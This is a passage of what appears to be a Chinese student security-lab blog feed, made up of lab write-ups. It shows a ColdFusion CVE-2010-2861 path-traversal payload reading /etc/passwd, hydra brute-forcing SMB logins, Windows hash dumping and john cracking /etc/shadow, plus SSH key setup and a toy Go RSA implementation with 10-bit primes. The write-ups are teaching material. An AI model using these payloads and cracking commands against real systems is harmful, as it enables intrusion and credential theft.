class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/vendor/autoload.php&#x27;</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);<br><br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>([<br>    <span class="hljs-comment">// Base URI is used with relative requests</span><br>    <span class="hljs-string">&#x27;base_uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://httpbin.org&#x27;</span>,<br>    <span class="hljs-comment">// You can set any number of default request options.</span><br>    <span class="hljs-string">&#x27;timeout&#x27;</span>  =&gt; <span class="hljs-number">2.0</span>,<br>]);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>);<br><br><span class="hljs-variable">$body</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$body</span>;<br></code></pre></td></tr></table></figure><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105171337299.png" class="" title="image-20230105171337299"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105171347372.png" class="" title="image-20230105171347372"><p>这里通过vps nc监听，并没有提供http代理服务器服务，但是可以看到这里收到了请求</p><h2 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p><h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>访问<code>http://192.168.147.3:8500/CFIDE/administrator/</code>密码为admin</p><p>完成初始化后</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172729376.png" class="" title="image-20230105172729376"><p>目录穿越，任意文件读取</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105172840904.png" class="" title="image-20230105172840904"><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/CFIDE/</span>administrator<span class="hljs-regexp">/enter.cfm?locale=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span>en<br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230105173048584.png" class="" title="image-20230105173048584">]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解windows linux密码</title>
    <link href="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/"/>
    <url>/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解windows，linux登陆密码"><a href="#暴力破解windows，linux登陆密码" class="headerlink" title="暴力破解windows，linux登陆密码"></a>暴力破解windows，linux登陆密码</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="hydra破解windows远程登陆密码"><a href="#hydra破解windows远程登陆密码" class="headerlink" title="hydra破解windows远程登陆密码"></a>hydra破解windows远程登陆密码</h3><p>首先，开启windowes远程登陆，并且关闭防火墙，查看用户名及ip地址</p><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221211101350963.png" class="" title="image-20221211101350963"><p>登陆kali主机<br>为了使破解成功</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">echo wi<span class="hljs-symbol">n123</span>$<span class="hljs-meta">%</span>^ &gt;&gt; fasttrack.txt<br></code></pre></td></tr></table></figure><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221211101625826.png" class="" title="image-20221211101625826"><p>查看端口开启情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS -P0 -sV -O<span class="hljs-number">192.168.147.11</span><br></code></pre></td></tr></table></figure><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221211101750914.png" class="" title="image-20221211101750914"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l sovo -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>fasttrack.txt smb:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">147.11</span><br></code></pre></td></tr></table></figure><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221211101903562.png" class="" title="image-20221211101903562"><h3 id="getpass获取密码"><a href="#getpass获取密码" class="headerlink" title="getpass获取密码"></a>getpass获取密码</h3><p><a href="https://github.com/avalon1610/GetPassword">https://github.com/avalon1610/GetPassword</a><br>获取源码后编译生成getpassword.exe<br>执行</p><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221211104923908.png" class="" title="image-20221211104923908"><h3 id="使用quarkpwdump导出windows用户密码hash值"><a href="#使用quarkpwdump导出windows用户密码hash值" class="headerlink" title="使用quarkpwdump导出windows用户密码hash值"></a>使用quarkpwdump导出windows用户密码hash值</h3><p><a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br>下载工具，cmd管理员身份打开</p><p>运行程序</p><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221213154122940.png" class="" title="image-20221213154122940"><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="使用hydra离线破解linux密码"><a href="#使用hydra离线破解linux密码" class="headerlink" title="使用hydra离线破解linux密码"></a>使用hydra离线破解linux密码</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221213165504399.png" class="" title="image-20221213165504399"><p>echo 123qwe &gt;&gt; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt<br>tail -n 1 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt</p><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221213165632003.png" class="" title="image-20221213165632003"><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221213165643881.png" class="" title="image-20221213165643881"><h3 id="将shadow文件复制出来，使用john暴力破解"><a href="#将shadow文件复制出来，使用john暴力破解" class="headerlink" title="将shadow文件复制出来，使用john暴力破解"></a>将shadow文件复制出来，使用john暴力破解</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --format=crypt  <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><img src="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3windows-linux%E5%AF%86%E7%A0%81/image-20221213171246580.png" class="" title="image-20221213171246580">]]></content>
    
    
    <categories>
      
      <category>信息系统安全实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>证书登陆云主机</title>
    <link href="/2022/12/10/%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86%E4%BA%91%E4%B8%BB%E6%9C%BA/"/>
    <url>/2022/12/10/%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86%E4%BA%91%E4%B8%BB%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="数字证书登陆云主机"><a href="#数字证书登陆云主机" class="headerlink" title="数字证书登陆云主机"></a>数字证书登陆云主机</h1><h2 id="证书登录策略设置"><a href="#证书登录策略设置" class="headerlink" title="证书登录策略设置"></a>证书登录策略设置</h2><p>首先先通过账号密码登陆云主机，然后修改配置文件***&#x2F;etc&#x2F;ssh&#x2F;sshd_config***</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/ssh/sshd_config<br>/Pub    搜索到配置项<br></code></pre></td></tr></table></figure><p>将下面两项取消注释</p><img src="/2022/12/10/%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86%E4%BA%91%E4%B8%BB%E6%9C%BA/image-20221210113310557.png" class="" title="image-20221210113310557"><p>:wq保存</p><h2 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h2><h3 id="证书已经存在"><a href="#证书已经存在" class="headerlink" title="证书已经存在"></a>证书已经存在</h3><img src="/2022/12/10/%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86%E4%BA%91%E4%B8%BB%E6%9C%BA/image-20221210113534882.png" class="" title="image-20221210113534882"><h3 id="证书不存在"><a href="#证书不存在" class="headerlink" title="证书不存在"></a>证书不存在</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen<br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/xavier/.ssh/id_rsa): id_rsa<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> id_rsa.<br>Your public key has been saved <span class="hljs-keyword">in</span> id_rsa.pub.<br>The key fingerprint is:<br>ce:89:59:3d:a1:3a:99:b3:01:46:78:0f:d1:cc:d4:fa xavier@Qbee-X<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+--[ RSA 2048]----+</span><br><span class="hljs-string">|    .=..         |</span><br><span class="hljs-string">|   . .+ .        |</span><br><span class="hljs-string">|  . +  .  .      |</span><br><span class="hljs-string">|   o o.  o .     |</span><br><span class="hljs-string">|    o ..S o      |</span><br><span class="hljs-string">|   . . XE. .     |</span><br><span class="hljs-string">|      X +        |</span><br><span class="hljs-string">|       =         |</span><br><span class="hljs-string">|      .          |</span><br><span class="hljs-string">+-----------------+</span><br></code></pre></td></tr></table></figure><p>通过ssh-keygen生成</p><h3 id="公钥上传"><a href="#公钥上传" class="headerlink" title="公钥上传"></a>公钥上传</h3><p>复制.pub内容</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbM3ISfId4hzrShbhv5xrKK+IiIhwmnsyHCTNb54bK43ybveaenD87B928Bc0L42jEmskvAxpt1mi9sH59wetPiq4nFtZyDoymUGykp6lmkj4ZSBTIHJfOBtti6rvekzB0Fq3L8pOff8V8Rv2VqYyqWvDZu4mG2qjFO3CDAQJZZumrgJ9U5wu86TScGrt6LvaXi1a664m6EGnwdtCpmX4lUan+vHSNspG62U8ALPG5zbBMYOqt08wwA9LjlNoxUJTMU/yyv6xGdUKD1P3sWOV59kFdVsTArkCCn9JRWteGKgKXueExptUpO+m9NF1Y7wLlFRQ7NGZxhua/Wv4v2l3s45SB1Wt+OZBX6yHnSUTMq1LQsCDp77ztwH9c81fWxuu37k9p2MYmca+nAD3zKx6r5uRlPx+0j3zi0DvcbTCcSmn2zvb1sCMYmt1c2Ag8UIBvjd1p/fIZZNM3Re6goj5pAYPM019Bfosu+OqmmHTWYXr7i/Cn6PCe+UYfCptSxm0= 邮箱地址<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim .ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>将公钥复制进去，保存</p><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><img src="/2022/12/10/%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86%E4%BA%91%E4%B8%BB%E6%9C%BA/image-20221210114253135-1670644034741-3.png" class="" title="image-20221210114253135">]]></content>
    
    
    <categories>
      
      <category>信息系统安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实现RSA算法加解密</title>
    <link href="/2022/11/15/%E5%AE%9E%E7%8E%B0RSA%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    <url>/2022/11/15/%E5%AE%9E%E7%8E%B0RSA%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="实现RSA加密算法"><a href="#实现RSA加密算法" class="headerlink" title="实现RSA加密算法"></a>实现RSA加密算法</h1><p>1、 选择一对不同的、足够大的素数p，q。</p><p>2、 计算n&#x3D;pq。</p><p>3、 计算f(n)&#x3D;(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。</p><p>4、 找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。</p><p>5、 计算d，使得de≡1 mod f(n)。这个公式也可以表达为d ≡e-1 mod f(n)<br> 这里要解释一下，≡是数论中表示同余的符号。公式中，≡符号的左边必须和符号右边同余，也就是两边模运算结果相同。显而易见，不管f(n)取什么值，符号右边1 mod f(n)的结果都等于1；符号的左边d与e的乘积做模运算后的结果也必须等于1。这就需要计算出d的值，让这个同余等式能够成立。</p><p>6、 公钥KU&#x3D;(e,n)，私钥KR&#x3D;(d,n)。</p><p>7、 加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为：<img src="/2022/11/15/%E5%AE%9E%E7%8E%B0RSA%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86/clip_image001.gif" class="" title="img">。</p><p>8、 解密过程为：<img src="/2022/11/15/%E5%AE%9E%E7%8E%B0RSA%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86/clip_image002.gif" class="" title="img">。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/rand&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateE</span><span class="hljs-params">(L *big.Int)</span></span> *big.Int &#123;<br><span class="hljs-keyword">var</span> t = big.NewInt(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">var</span> gcd *big.Int<br><span class="hljs-keyword">for</span> t.Cmp(L) &lt;= <span class="hljs-number">0</span> &#123;<br>gcd = <span class="hljs-built_in">new</span>(big.Int).GCD(<span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, t, L)<br><span class="hljs-keyword">if</span> gcd.Cmp(big.NewInt(<span class="hljs-number">1</span>)) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> t<br>&#125;<br>t = big.NewInt(<span class="hljs-number">0</span>).Add(t, big.NewInt(<span class="hljs-number">1</span>))<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">//求摸余一</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ModOne</span><span class="hljs-params">(L, E *big.Int)</span></span> *big.Int &#123;<br><span class="hljs-keyword">var</span> t = big.NewInt(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">var</span> result, mul *big.Int<br><span class="hljs-keyword">for</span> t.Cmp(L) &lt; <span class="hljs-number">0</span> &#123;<br>mul = big.NewInt(<span class="hljs-number">0</span>).Mul(E, t)<br>result = big.NewInt(<span class="hljs-number">0</span>).Mod(mul, L)<br><span class="hljs-keyword">if</span> result.Cmp(big.NewInt(<span class="hljs-number">1</span>)) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> t<br>&#125;<br>t = big.NewInt(<span class="hljs-number">0</span>).Add(t, big.NewInt(<span class="hljs-number">1</span>))<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">//产生公私钥</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ProduceRSA</span><span class="hljs-params">()</span></span> (*big.Int, *big.Int, *big.Int) &#123;<br>P, err := rand.Prime(rand.Reader, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>&#125;<br>Q, err := rand.Prime(rand.Reader, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>&#125;<br>N := <span class="hljs-built_in">new</span>(big.Int).Mul(P, Q)<br>GCD := <span class="hljs-built_in">new</span>(big.Int).GCD(<span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-built_in">new</span>(big.Int).Sub(P, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">1</span>)), <span class="hljs-built_in">new</span>(big.Int).Sub(Q, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">1</span>)))<br>MULPQ := <span class="hljs-built_in">new</span>(big.Int).Mul(<span class="hljs-built_in">new</span>(big.Int).Sub(P, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">1</span>)), <span class="hljs-built_in">new</span>(big.Int).Sub(Q, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">1</span>)))<br>L := <span class="hljs-built_in">new</span>(big.Int).Div(MULPQ, GCD)<br>E := GenerateE(L)<br>D := ModOne(L, E)<br><span class="hljs-keyword">return</span> E, D, N<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>E, D, N := ProduceRSA()<br>fmt.Println(<span class="hljs-string">&quot;E:&quot;</span> + E.String())<br>fmt.Println(<span class="hljs-string">&quot;D:&quot;</span> + D.String())<br>fmt.Println(<span class="hljs-string">&quot;N:&quot;</span> + N.String())<br>fmt.Println(<span class="hljs-string">&quot;-------------------加密信息-----------------&quot;</span>)<br><span class="hljs-keyword">var</span> plain <span class="hljs-type">string</span><br>fmt.Printf(<span class="hljs-string">&quot;输入待加密解密数据:&quot;</span>)<br>_, _ = fmt.Scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;plain)<br><span class="hljs-keyword">var</span> s3 = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int64</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> plain &#123;<br><span class="hljs-keyword">var</span> content = big.NewInt(<span class="hljs-type">int64</span>(i))<br>z := <span class="hljs-built_in">new</span>(big.Int).Exp(content, E, N)<br>s3 = <span class="hljs-built_in">append</span>(s3, z.Int64())<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;加密后的结果:&quot;</span>, s3)<br>fmt.Println(<span class="hljs-string">&quot;-------------------解密信息-----------------&quot;</span>)<br><span class="hljs-keyword">var</span> m <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> s3 &#123;<br><span class="hljs-keyword">var</span> scontent = big.NewInt(<span class="hljs-number">0</span>).SetInt64(<span class="hljs-type">int64</span>(i))<br><span class="hljs-comment">//3.2 计算 调用exp函数:将s = (scontent^d mod n) 并返回s</span><br>s := <span class="hljs-built_in">new</span>(big.Int).Exp(scontent, D, N)<br>m += <span class="hljs-type">string</span>(s.Int64())<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;解密后的结果&quot;</span>, m)<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/11/15/%E5%AE%9E%E7%8E%B0RSA%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86/image-20221115224237104-1668523537253-3.png" class="" title="image-20221115224237104">]]></content>
    
    
    <categories>
      
      <category>信息系统安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大素数生成算法</title>
    <link href="/2022/11/14/%E5%A4%A7%E7%B4%A0%E6%95%B0%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/"/>
    <url>/2022/11/14/%E5%A4%A7%E7%B4%A0%E6%95%B0%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="大素数生成算法，不同素数生成算法优劣"><a href="#大素数生成算法，不同素数生成算法优劣" class="headerlink" title="大素数生成算法，不同素数生成算法优劣"></a>大素数生成算法，不同素数生成算法优劣</h1><h2 id="费马小定理素数判定法"><a href="#费马小定理素数判定法" class="headerlink" title="费马小定理素数判定法"></a>费马小定理素数判定法</h2><blockquote><p> Fermat 定理： n是一个奇素数，a是任何整数(1≤ a≤n-1) ，则 a^(n-1)≡1(mod n)。</p></blockquote><p><em>给出n如果1&lt;a&lt;&#x3D;n-1都有a^n≡a(mod n),则认为n为素数</em></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><br><span class="hljs-comment">//用于提供长度为n的数，用于提取大素数，</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateBigRange</span><span class="hljs-params">(n <span class="hljs-type">int64</span>)</span></span> *big.Int &#123;<br><span class="hljs-comment">//将go默认类型转化为big.Int类型</span><br>length := <span class="hljs-built_in">new</span>(big.Int).SetInt64(n)<br><span class="hljs-comment">//设置strng为int并给基数解释</span><br>re, _ := <span class="hljs-built_in">new</span>(big.Int).SetString(<span class="hljs-string">&quot;10&quot;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-comment">//返回re**length%nil,这里为nil则不取模</span><br>re.Exp(re, length, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> re<br>&#125;<br><br><span class="hljs-comment">//利用费马小定理判断,如果a是素数，则(a ^ (n - 1)) % n恒等于1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fmod</span><span class="hljs-params">(n *big.Int, a <span class="hljs-type">int64</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>one, _ := <span class="hljs-built_in">new</span>(big.Int).SetString(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">10</span>)<br>n_ := <span class="hljs-built_in">new</span>(big.Int).Sub(n, one)<br>result := <span class="hljs-built_in">new</span>(big.Int).Exp(<span class="hljs-built_in">new</span>(big.Int).SetInt64(a), n_, n)<br><span class="hljs-keyword">if</span> result.String() != <span class="hljs-string">&quot;1&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-comment">//此时出错 返回false 结果必须要为1</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">//生成大数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateBigNum</span><span class="hljs-params">(n <span class="hljs-type">int64</span>)</span></span> *big.Int &#123;<br>numRange := GenerateBigRange(n)<br>ran := rand.New(rand.NewSource(time.Now().UnixNano())) <span class="hljs-comment">//创建的时候需要初始化其中一个值 用于生成随机数</span><br>ran.Seed(time.Now().UnixNano())<br>p := <span class="hljs-built_in">new</span>(big.Int).Rand(ran, numRange)<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br><span class="hljs-comment">//素性检测</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fermat_Prime</span><span 